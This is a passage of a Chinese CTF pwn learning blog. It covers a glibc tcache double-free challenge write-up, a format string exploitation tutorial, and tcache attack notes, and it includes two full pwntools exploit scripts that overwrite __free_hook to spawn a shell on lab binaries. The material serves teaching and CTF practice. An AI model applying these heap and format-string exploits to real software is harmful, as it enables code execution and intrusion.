<span class="comment">/* This test succeeds on double free.  However, we don't 100%</span></span><br><span class="line"><span class="comment">           trust it (it also matches random payload data at a 1 in</span></span><br><span class="line"><span class="comment">           2^&lt;size_t&gt; chance), so verify it's not an unlikely</span></span><br><span class="line"><span class="comment">           coincidence before aborting.  */</span></span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely (e-&gt;key == tcache))</span><br><span class="line">          &#123;</span><br><span class="line">            tcache_entry *tmp;</span><br><span class="line">            LIBC_PROBE (memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line">            <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx]; tmp; tmp = tmp-&gt;next)</span><br><span class="line">              <span class="keyword">if</span> (tmp == e)</span><br><span class="line">                malloc_printerr (<span class="string">"free(): double free detected in tcache 2"</span>);</span><br><span class="line">                <span class="comment">/* If we get here, it was a coincidence.  We've wasted a</span></span><br><span class="line"><span class="comment">                   few cycles, but don't abort.  */</span></span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">          &#123;</span><br><span class="line">            tcache_put (p, tc_idx);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>主要是针对tache bins 二次释放的，但是这题fd 不好被控制，edit不能改一当前chunk的fd，自己在昨天实际就默认忽略这思路（雾）</p><p>更多具体可以看：</p><p><a href="https://www.anquanke.com/post/id/219292#h3-7" target="_blank" rel="noopener">https://www.anquanke.com/post/id/219292#h3-7</a></p><h2 id="另一思路"><a href="#另一思路" class="headerlink" title="另一思路"></a>另一思路</h2><p>看了大佬的wp发现这题free处指向我们能控制chunk内容的chunk，我们可以修改free_hook写入system 从而写shell。</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">e=ELF(<span class="string">'/glibc/2.27/amd64/lib/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">'./1pwn'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(num,size)</span>:</span></span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'input index'</span>)</span><br><span class="line">p.sendline(str(num))</span><br><span class="line">p.recvuntil(<span class="string">'input size'</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(num)</span>:</span></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'input index'</span>)</span><br><span class="line">p.sendline(str(num))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(num,text)</span>:</span></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'input index'</span>)</span><br><span class="line">p.sendline(str(num))</span><br><span class="line">p.recvuntil(<span class="string">'input content'</span>)</span><br><span class="line">p.send(text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(num)</span>:</span></span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'input index'</span>)</span><br><span class="line">p.sendline(str(num))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leaveYourName</span><span class="params">(text)</span>:</span></span><br><span class="line">p.sendline(<span class="string">'5'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'your name:'</span>)</span><br><span class="line">p.sendline(text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">showYourName</span><span class="params">(text)</span>:</span></span><br><span class="line">p.sendline(<span class="string">'6'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x59</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x28</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">'wwww\n'</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x58</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="string">'wwww\n'</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x59</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">add(i+<span class="number">4</span>,<span class="number">0x58</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">free(i+<span class="number">4</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">add(i+<span class="number">4</span>,<span class="number">0x59</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">free(i+<span class="number">4</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">add(i+<span class="number">4</span>,<span class="number">0x28</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">free(i+<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">leaveYourName(<span class="string">'k'</span>*<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">caddr=u64(p.recvuntil(<span class="string">'\x55'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-0x970</span></span><br><span class="line">log.info(<span class="string">':'</span>+hex(caddr))</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">addr=u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-96</span></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">'main_arena:'</span>+hex(addr))</span><br><span class="line"></span><br><span class="line">base=addr<span class="number">-0x3afc40</span></span><br><span class="line">log.info(<span class="string">'base:'</span>+hex(base))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x10</span>)</span><br><span class="line">free(<span class="number">11</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0x21</span>)+p64(base+e.symbols[<span class="string">'__free_hook'</span>]<span class="number">-0x8</span>))</span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">11</span>,p64(base+e.symbols[<span class="string">'system'</span>]))</span><br><span class="line"></span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0x21</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>)+<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">free(<span class="number">11</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://www.anquanke.com/post/id/219292" target="_blank" rel="noopener">https://www.anquanke.com/post/id/219292</a></p><p><a href="https://www.cnblogs.com/lemon629/p/14327460.html" target="_blank" rel="noopener">https://www.cnblogs.com/lemon629/p/14327460.html</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于格式化字符串利用——学pwn小记(9)</title>
      <link href="/2021/04/25/%E5%85%B3%E4%BA%8E%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%88%A9%E7%94%A8%E2%80%94%E2%80%94%E5%AD%A6pwn%E5%B0%8F%E8%AE%B0(9)/"/>
      <url>/2021/04/25/%E5%85%B3%E4%BA%8E%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%88%A9%E7%94%A8%E2%80%94%E2%80%94%E5%AD%A6pwn%E5%B0%8F%E8%AE%B0(9)/</url>
      
        <content type="html"><![CDATA[<p>格式化字符是格式化字符串函数根据某一字符串参数的内容来进行解析,根据其值来处理解析的其他参数的个数和值的情形。换句话说,一个函数第一个参数作为格式化字符串，根据其来解析之后的参数的过程就是格式化字符串的过程。<a id="more"></a></p><h2 id="格式化字符串函数"><a href="#格式化字符串函数" class="headerlink" title="格式化字符串函数"></a>格式化字符串函数</h2><p>能进行格式化字符串操作的函数被称为格式化字符串函数。常见的格式化字符串函数有：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">printf</span><span class="params">(<span class="keyword">const</span> chr *format,...)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fprintf</span><span class="params">(FILE *stream,<span class="keyword">const</span> chr *format,...)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dprintf</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">const</span> chr *format,...)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sprintf</span><span class="params">(<span class="keyword">char</span> *str,<span class="keyword">const</span> chr *format,....)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">snprintf</span><span class="params">(<span class="keyword">char</span> *str,<span class="keyword">size_t</span> <span class="built_in">size</span>,<span class="keyword">const</span> chr *format,....)</span></span>;  </span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdarg.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vprintf</span><span class="params">(<span class="keyword">const</span> chr *format,va_list ap)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vfprintf</span><span class="params">(FILE *stream,<span class="keyword">const</span> chr *format,va_list ap)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vdprintf</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">const</span> chr *format,va_list ap)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vsprintf</span><span class="params">(<span class="keyword">char</span> *str,<span class="keyword">const</span> chr *format,va_list ap)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vsnprintf</span><span class="params">(<span class="keyword">char</span> *str,<span class="keyword">size_t</span> <span class="built_in">size</span>,<span class="keyword">const</span> chr *format,va_list ap)</span></span>;</span><br></pre></td></tr></table></figure><h2 id="格式化字符串参数"><a href="#格式化字符串参数" class="headerlink" title="格式化字符串参数"></a>格式化字符串参数</h2><h3 id="指示符"><a href="#指示符" class="headerlink" title="指示符"></a>指示符</h3><p>%c：输出字符，配上%n可用于向指定地址写数据。</p><p>%d：输出十进制整数，配上%n可用于向指定地址写数据。</p><p>%x：输出16进制数据，如%i$x表示要泄漏偏移i处4字节长的16进制数据，%i$lx表示要泄漏偏移i处8字节长的16进制数据，32bit和64bit环境下一样。</p><p>%p：输出16进制数据，与%x基本一样，只是附加了前缀0x，在32bit下输出4字节，在64bit下输出8字节，可通过输出字节的长度来判断目标环境是32bit还是64bit。</p><p>%s：输出的内容是字符串，即将偏移处指针指向的字符串输出，如%i$s表示输出偏移i处地址所指向的字符串，在32bit和64bit环境下一样，可用于读取GOT表等信息。</p><p>%n：将%n之前printf已经打印的字符个数赋值给偏移处指针所指向的地址位置，如%100×10$n表示将0x64写入偏移10处保存的指针所指向的地址（4字节），而%$hn表示写入的地址空间为2字节，%$hhn表示写入的地址空间为1字节，%$lln表示写入的地址空间为8字节，在32bit和64bit环境下一样。有时，直接写4字节会导致程序崩溃或等候时间过长，可以通过%$hn或%$hhn来适时调整。</p><p>%n是通过格式化字符串漏洞改变程序流程的关键方式，而其他格式化字符串参数可用于读取信息或配合%n写数据。</p><h3 id="修饰符"><a href="#修饰符" class="headerlink" title="修饰符"></a>修饰符</h3><p>hh ： 类型  1-byte</p><p>h   ： 类型  2-byte</p><p>l    ： 类型  4-byte</p><p>ll    :   类型  8-byte</p><h3 id="格式化字符串利用"><a href="#格式化字符串利用" class="headerlink" title="格式化字符串利用"></a>格式化字符串利用</h3><h4 id="数据泄露"><a href="#数据泄露" class="headerlink" title="数据泄露"></a>数据泄露</h4><h5 id="栈数据泄露"><a href="#栈数据泄露" class="headerlink" title="栈数据泄露"></a>栈数据泄露</h5><p>我们可以利用多个<code>%08x.%08x.%08x.%08x</code>或<code>%p,%p,%p,%p</code>来泄露上面的信息.<br>        同时，如果我们知道了要泄露数据在栈上的位置我们可以通过<code>%(x)$p</code>来泄露第<code>（x）</code>个参数的信息。</p><h5 id="任意地址数据泄露"><a href="#任意地址数据泄露" class="headerlink" title="任意地址数据泄露"></a>任意地址数据泄露</h5><p>类似”%s”的格式，我们可以用它泄露出参数指针所指向内存的数据。</p><p>例如<code>&#39;%(x)$s’+hackaddress</code>,若第<code>（x）</code>个参数刚好存放的是hackaddress，则会读取hackaddress所指向的值。</p><p>注意：类似”\x07”、“\x08”、”\x20”等不可见字符可能泄露不出来。</p><h4 id="内存覆盖"><a href="#内存覆盖" class="headerlink" title="内存覆盖"></a>内存覆盖</h4><p>我们可以利用格式化字符串，对任意地址进行覆盖。</p><p>我们可以通过<code>%n</code>将前面字符的数量写入特点地址中，例如：</p><p><code>wwww%10$n</code>表将4写入第10个参数所对应的地址中（在使用中要注意，栈上数据对其，即32位4个字节一个单位,64位8个字节一个单位）</p><p>同时我们可以利用修饰符来降低我们覆盖地址时工作，’%hhn’让我们一次只写入一个字节的数据，从而避免为改一字节而改变整个单位数据。</p><p>我们也可以用<code>%（x）c%n</code>来代替（x）个’w’从而减短payload长度。</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://ctf-wiki.org/pwn/linux/fmtstr/fmtstr_intro/" target="_blank" rel="noopener">https://ctf-wiki.org/pwn/linux/fmtstr/fmtstr_intro/</a></p><p><a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.1_format_string.html" target="_blank" rel="noopener">https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.1_format_string.html</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tcache attack初学习——学pwn小记(8)</title>
      <link href="/2021/04/17/Tcache%20attack%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94%E5%AD%A6pwn%E5%B0%8F%E8%AE%B0(8)/"/>
      <url>/2021/04/17/Tcache%20attack%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94%E5%AD%A6pwn%E5%B0%8F%E8%AE%B0(8)/</url>
      
        <content type="html"><![CDATA[<p>Tcache是2.26 libc中新引入的一种缓存的机制,由于它对每个线程增加一个bin缓存，这样能显著地提高性能.这样一个机制在提高效率的同时也带来了安全隐患.<a id="more"></a></p><h2 id="Tcache相关数据结构"><a href="#Tcache相关数据结构" class="headerlink" title="Tcache相关数据结构"></a>Tcache相关数据结构</h2><p><code>tcache_entry</code>和<code>tcache_perthread_struct</code>是跟Tcache相关的两个结构.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* We overlay this structure on the user-data portion of a chunk when the chunk is stored in the per-thread cache.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"><span class="comment">/* There is one of these for each thread, which contains the per-thread cache (hence "tcache_perthread_struct").  Keeping overall size low is mildly important.  Note that COUNTS and ENTRIES are redundant (we could have just counted the linked list each time), this is for performance reasons.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"><span class="keyword">static</span> __thread tcache_perthread_struct *tcache = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure><p><code>tcache_entry</code>是存放相同大小堆块中，最后一块放入<code>Tcache</code>的<code>Tcache bin</code>的指针。（然后有点类似fast bin再在这块中的<code>fd</code>位置写入上一个放入<code>Tcache</code>的堆块内容（用户数据，即堆头+0x10）的指针）</p><p><code>tcache_perthread_struct</code>是主要用来存放管理Tcache的结构体，这个结构体分两部分来看待：</p><p>用来统计存放放入<code>Tcache</code>中各大小bin的数量。</p><p>存放各大小bin中，最优先被取出的bin的地址。</p><p><code>tcache_perthread_struct</code>中具体存放的多少由宏定义中的<code>TCACHE_MAX_BINS</code>来确定。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line"><span class="comment">/* We want 64 entries.  This is an arbitrary limit, which tunables can reduce.  */</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> TCACHE_MAX_BINS        64 <span class="comment">/*tcache 每个大小bins 种类数*/</span></span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> MAX_TCACHE_SIZE    tidx2usize (TCACHE_MAX_BINS-1)</span></span><br><span class="line"><span class="comment">/* Only used to pre-fill the tunables.  */</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> tidx2usize(idx)    (((size_t) idx) * MALLOC_ALIGNMENT + MINSIZE - SIZE_SZ)</span></span><br><span class="line"><span class="comment">/* When "x" is from chunksize().  */</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)</span></span><br><span class="line"><span class="comment">/* When "x" is a user-provided size.  */</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> usize2tidx(x) csize2tidx (request2size (x))</span></span><br><span class="line"><span class="comment">/* With rounding and alignment, the bins are...</span></span><br><span class="line"><span class="comment">   idx 0   bytes 0..24 (64-bit) or 0..12 (32-bit)</span></span><br><span class="line"><span class="comment">   idx 1   bytes 25..40 or 13..20</span></span><br><span class="line"><span class="comment">   idx 2   bytes 41..56 or 21..28</span></span><br><span class="line"><span class="comment">   etc.  */</span></span><br><span class="line"><span class="comment">/* This is another arbitrary limit, which tunables can change.  Each</span></span><br><span class="line"><span class="comment">   tcache bin will hold at most this number of chunks.  */</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> TCACHE_FILL_COUNT 7  <span class="comment">/*tcache 每个大小bins 最大存放数量*/</span></span></span><br></pre></td></tr></table></figure><h2 id="pwn中利用方法"><a href="#pwn中利用方法" class="headerlink" title="pwn中利用方法"></a>pwn中利用方法</h2><h3 id="二次释放"><a href="#二次释放" class="headerlink" title="二次释放"></a>二次释放</h3><p>由于tcahe 检测在free和malloc 靠前位置导致一些检测未进行。因此在tcache中我们可直接free 二次同一堆块，即可照成二次释放。</p><p><img src="image-20210418131641002.png" alt="image-20210418131641002"></p><h3 id="塞满tcahe泄露libc"><a href="#塞满tcahe泄露libc" class="headerlink" title="塞满tcahe泄露libc"></a>塞满tcahe泄露libc</h3><p>我们可以通过free 7个 bins塞满tcahe后，释放一个unsortedbin来泄露地址。</p><p><img src="image-20210418132000075.png" alt="image-20210418132000075"></p><h4 id="例题：gumad"><a href="#例题：gumad" class="headerlink" title="例题：gumad"></a>例题：gumad</h4><p>分析题目，利用连续free 7个chunk 塞满tcache，再释放一个unsortedbin来泄露地址。</p><p>再利用二次释放,改fd带chunk 0指针存放处,改chunk 0 fd指针为free_hook.再在free_hook处创造chunk 写入shell.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=remote('challenge-6759487098ea2b0b.sandbox.ctfhub.com',23648)</span></span><br><span class="line">p=process(<span class="string">'./gundam'</span>)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build</span><span class="params">(name)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice : "</span>,<span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"gundam :"</span>,name)</span><br><span class="line">    p.sendlineafter(<span class="string">"gundam :"</span>,<span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">visit</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice : "</span>,<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice : "</span>,<span class="string">'3'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Destory:"</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">blow_up</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice : "</span>,<span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">build(<span class="string">'a'</span>*<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">free(i)</span><br><span class="line">blow_up()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">build(<span class="string">'a'</span>*<span class="number">0x4</span>)</span><br><span class="line">build(<span class="string">'B'</span>*<span class="number">7</span>)</span><br><span class="line">blow_up()</span><br><span class="line">visit()</span><br><span class="line">addr = (p.recvuntil(<span class="string">"Type[7]"</span>,drop=<span class="literal">True</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">print(addr)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">print(hex(u64(addr)))</span><br><span class="line">base=u64(addr)<span class="number">-0x3afca0</span></span><br><span class="line">print(hex(base))</span><br><span class="line">free_hook=base+<span class="number">0x3b18e8</span></span><br><span class="line">print(<span class="string">'4'</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">blow_up()</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">build(p64(free_hook))</span><br><span class="line"></span><br><span class="line">build(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line">build(p64(base+<span class="number">0x41780</span>))</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="更改tcache-perthread-struct"><a href="#更改tcache-perthread-struct" class="headerlink" title="更改tcache_perthread_struct"></a>更改tcache_perthread_struct</h3><p><code>tcache_perthread_struct</code>一般是堆开头的第一个堆块，大小为0x250(amd64).我们可以通过gdb中<code>bins</code>与<code>p *(struct tcache_perthread_struct*)</code>来查看其信息。</p><p><img src="image-20210418133641326.png" 